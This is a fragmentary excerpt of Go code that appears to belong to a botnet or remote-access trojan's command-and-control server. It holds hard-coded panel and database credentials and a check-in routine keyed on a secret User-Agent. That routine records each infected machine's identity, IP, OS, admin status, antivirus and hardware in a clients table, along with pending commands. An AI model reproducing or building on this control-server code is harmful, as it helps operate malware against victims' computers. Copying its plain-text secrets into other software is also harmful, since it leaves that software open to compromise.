...
var (
	ControlUser = "root"                             //Hard Coded Username
	ControlPass = "7b24afc8bc80e548d66c4e7ff72171c5" //Hard Coded Password (MD5: toor)

	useSSL       = false                              //Use SSL?
	myIP         = "127.0.0.1"                        //IP to run Server on
	...
	pqUser = "postgres"  //SQL Database Username
	pqPass = "thisisme!" //SQL Database Password
	pqHost = "localhost" //SQL Database Host
		...
		if isNew {
			if request.UserAgent() == userAgentKey {
				...
				case err == sql.ErrNoRows:
					_, err = db.Exec("INSERT INTO clients(guid, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastcheckin, lastcommand) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", GUID, IP, WHOAMI, OS, INSTALL, ADMIN, AV, CPU, GPU, VERSION, time.Now().Format(time.RFC1123Z), "Not Completed....")
					if err != nil {
...
func main() {
	...
	// db, err = sql.Open("postgres", "user="+pqUser+"password="+pqPass+"dbname="+pqName+"sslmode=disable")
	db, err = sql.Open("postgres", "postgres://"+pqUser+":"+pqPass+"@localhost/"+pqName+"?sslmode=disable")
	if err != nil {
